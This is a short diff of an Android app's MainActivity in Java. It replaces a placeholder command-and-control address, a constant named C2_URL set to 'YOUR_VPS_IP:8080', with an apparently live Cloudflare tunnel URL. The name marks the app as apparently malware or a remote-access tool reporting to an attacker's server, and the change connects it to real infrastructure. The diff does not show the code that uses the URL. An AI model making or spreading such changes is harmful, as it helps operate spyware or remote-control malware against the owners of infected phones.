@@ -22,7 +22,7 @@ import java.util.Locale;
 
 public class MainActivity extends Activity {
 
-    private static final String C2_URL = "http://YOUR_VPS_IP:8080";
+    private static final String C2_URL = "https://envelope-onto-skill-cap.trycloudflare.com";
     private Handler handler = new Handler(Looper.getMainLooper());
 
     @Override
